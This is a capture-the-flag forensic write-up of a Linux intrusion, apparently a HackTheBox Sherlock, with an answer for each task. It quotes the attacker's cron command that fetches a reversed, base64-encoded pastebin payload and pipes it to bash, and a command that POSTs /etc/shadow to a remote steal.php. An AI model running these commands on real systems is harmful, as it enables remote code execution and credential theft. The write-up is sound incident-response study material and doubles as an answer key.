

---



#### Sherlock Scenario

The IT Manager of Techniqua-Solutions Corp. is responsible for managing the company’s infrastructure. As part of his daily work, he frequently accesses company servers and workstations. One morning, the IT Manager discovered that several critical company files were missing, while others had been modified or replaced with unfamiliar ones. Concerned about a potential breach, he reported the issue to the security team.

As an incident response analyst, your task is to investigate the case. You have been provided with a forensic image of the IT Manager’s machine.



---


Task 1

What method did the attacker use to gain access to the system?


```
Brute Force
```


Looking at the auth log in /var/logs/  we can see TA brute forced the password for Administrator

<img width="1410" height="617" alt="image" src="https://github.com/user-attachments/assets/8f311248-30ee-4038-9662-b9ebca24ca58" />









Task 2

At what time did the attacker successfully log in for the first time?


```
2025-02-10 19:39:03
```


We can see multiple failed login attempts from the same IP followed by a successful login
<img width="1321" height="371" alt="image" src="https://github.com/user-attachments/assets/b20f3981-07c3-441e-b6d7-b88f45fdf435" />








Task 3

Which user account was compromised by the attacker?

```
administrator
```


Checking the administrator users bash history, its running malicious tools
<img width="998" height="646" alt="image" src="https://github.com/user-attachments/assets/a0dcb194-acaf-491d-9815-c7b707c73c9c" />






Task 4

What command was executed by the attacker to check user privileges?

```
groups administrator
```

<img width="920" height="634" alt="image" src="https://github.com/user-attachments/assets/93aaab70-c8e7-4d92-8a1e-237d641c817f" />







Task 5

What was the first tool the attacker downloaded to extract stored credentials from the system?


```
LaZagne
```


<img width="954" height="640" alt="image" src="https://github.com/user-attachments/assets/9946d1d6-8f05-4fde-9e99-047c8ee94da8" />








Task 6

The attacker located sensitive files on the compromised system and transferred them to a remote machine. Which command-line tool was used for this exfiltration?


```
scp
```


<img width="1201" height="608" alt="image" src="https://github.com/user-attachments/assets/9c953ec6-2d7c-4c51-8519-a434c20b0c0c" />





Task 7

What IP did the attacker exfiltrate the files to?

```
192.168.161.198
```





<img width="1004" height="620" alt="image" src="https://github.com/user-attachments/assets/08841794-fa14-4d52-8a08-ae5615477336" />





Task 8

The attacker continued their exploitation and executed a malicious script on the victim machine. What is the name of the script?

```
sys_monitor.sh
```


Check the administrators bash history
<img width="755" height="611" alt="image" src="https://github.com/user-attachments/assets/bf38ace3-c9ca-4428-9ea0-092da8bfae43" />





Task 9

What is the SHA1 hash of the malware?

```
3ae5dea716a4f7bfb18046bfba0553ea01021c75
```


We can find the sys_monitor.sh hash in hash_executables file in the hash executable folder
<img width="1330" height="606" alt="image" src="https://github.com/user-attachments/assets/06386f96-f39e-442f-bad9-be90714fef81" />






Task 10

The malware installed a component that pretends to be part of system network management but is actually running with root privileges. What is the name of the component?


```
systemd-networkm.service
```



We can find an unusual service in /etc/systemd/system. Usually this file is called systemd-networkd.service. 
<img width="903" height="497" alt="image" src="https://github.com/user-attachments/assets/66643ac0-a4f0-4c67-8c7c-2076670121c3" />





Task 11

The attacker modified several startup configuration files, each spawning a network listener on a different port at login. What is the name of the file that starts the listener on the lowest port number?

```
.bashrc
```




We can find two shell startup files in /root/root directory which contains listeners
<img width="1254" height="465" alt="image" src="https://github.com/user-attachments/assets/53cd7c8d-e299-4cb2-8d17-926f4f26c5f2" />

<img width="1252" height="607" alt="image" src="https://github.com/user-attachments/assets/7e94e633-a247-4d0d-ad8c-a53bd254487b" />




Task 12

What is the username and hostname associated with the attacker?

```
kali@kali
```


TA added his ssh key and hostname to the authorized keys file in root directory
<img width="1325" height="219" alt="image" src="https://github.com/user-attachments/assets/5ee5df56-5369-4843-8ec6-453dcbeabe0b" />





Task 13

The attacker created a user for persistence, what is the name of the created user?

```
Regev
```

We can look in the auth log user creation events by searching for useradd or adduser
<img width="1358" height="582" alt="image" src="https://github.com/user-attachments/assets/2984281c-2931-4b38-92fe-cdb4d9ccd49a" />




Task 14

At what exact timestamp was the new user created on the system?

<img width="1343" height="624" alt="image" src="https://github.com/user-attachments/assets/c3240fba-dc72-4f16-a598-34fee4cf2011" />









Task 15

The malware set up an automated process to fetch and execute a remote payload from a legitimate web service. What is the full command responsible for retrieving this payload?

```
command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
```


cron jobs are often associated with automated processes so by looking through the different cron jobs in  /etc, we can find a suspicious cron job named "syscheck" in /etc/cron.d

<img width="1429" height="362" alt="image" src="https://github.com/user-attachments/assets/7f268d2f-be0d-4d1e-8506-5e67602855a9" />





Task 16



The payload was used to extract more sensitive files. What was the command ran to extract the more sensitive file?

```
base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
```


Open the pastebin link and you will find a base64 string. The payload is reversed and base64 encoded as we can see here
<img width="1429" height="362" alt="image" src="https://github.com/user-attachments/assets/aceaeefb-a710-46f3-8961-0e44adb326d1" />


We can use https://gchq.github.io/CyberChef/ to decode the full payload
<img width="1349" height="685" alt="image" src="https://github.com/user-attachments/assets/d89169d6-5d7b-4b6a-b178-c33fb205fd02" />

